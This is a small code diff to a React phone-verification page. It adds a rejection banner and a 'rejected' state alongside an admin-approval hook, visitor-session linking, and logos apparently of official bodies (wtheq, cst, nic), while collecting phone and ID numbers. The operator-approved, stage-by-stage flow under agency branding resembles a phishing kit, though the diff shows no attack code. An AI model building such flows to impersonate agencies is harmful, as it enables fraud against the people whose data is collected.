@@ -7,6 +7,7 @@ import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval"
 import { toast } from "sonner";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
+import RejectionBanner from "@/components/RejectionBanner";
 import wtheqLogo from "@/assets/wtheq-logo.png";
 import cstLogo from "@/assets/cst-logo.png";
 import nicLogo from "@/assets/nic-logo.png";
@@ -36,6 +37,7 @@ const PhoneVerification = () => {
   const [showCarriers, setShowCarriers] = useState(false);
   const [loading, setLoading] = useState(false);
   const [waitingApproval, setWaitingApproval] = useState(false);
+  const [rejected, setRejected] = useState(false);
   const [orderId, setOrderId] = useState<string | null>(passedOrderId);
   const [phoneError, setPhoneError] = useState("");
   const [idError, setIdError] = useState("");
